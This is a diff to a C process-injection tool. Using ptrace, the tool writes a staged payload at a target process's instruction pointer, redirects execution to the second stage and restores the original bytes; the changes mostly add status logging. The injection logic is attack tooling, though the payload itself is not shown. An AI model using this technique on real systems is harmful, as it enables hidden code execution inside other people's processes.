@@ -76,11 +76,8 @@ int main(int argc, char *argv[]) {
       return 1;
    }
 
-   if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
-      perror("ptrace");
-      return 1;
-   }
-
+   printf("[+] attaching to pid <%d>\n", pid);
+   PTRACE_CALL(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    struct user_regs_struct regs = {0};
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
@@ -89,6 +86,7 @@ int main(int argc, char *argv[]) {
    }
 
    void *target_addr = (void*)regs.rip;
+   printf("[*] got original IP: 0x%llx\n", regs.rip);
 
    orig_data = malloc(payload_len);
    if (!orig_data) {
@@ -97,11 +95,13 @@ int main(int argc, char *argv[]) {
    }
    orig_data_len = payload_len;
 
+   printf("[+] saving original data after RIP\n");
    if (!_read_process_memory(pid, target_addr, orig_data, payload_len)) {
       free(orig_data);
       return 1;
    }
 
+   printf("[+] writing stage 0 to target (%ld bytes)\n", payload_len);
    if (!_write_process_memory(pid, target_addr, payload, payload_len)) {
       free(orig_data);
       return 1;
@@ -115,19 +115,23 @@ int main(int argc, char *argv[]) {
 
    struct user_regs_struct regs2 = {0};
    PTRACE_CALL(PTRACE_GETREGS, pid, NULL, &regs2);
+   printf("[*] stage 1 written to address 0x%llx in target\n", regs2.r8);
    regs2.rip = regs2.r8;
    regs2.r14 = regs.rip;
+   printf("[+] redirecting IP to stage 1\n");
    PTRACE_CALL(PTRACE_SETREGS, pid, NULL, &regs2);
 
+   printf("[+] restoring data after original IP\n");
    if (!_write_process_memory(pid, target_addr, orig_data, payload_len)) {
       free(orig_data);
       return 1;
    }
 
+   printf("[+] resuming target process\n");
    PTRACE_CALL(PTRACE_SINGLESTEP, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    PTRACE_CALL(PTRACE_DETACH, pid, NULL, NULL);
 
-   printf("done\n");
+   printf("[*] done\n");
    return 0;
 }
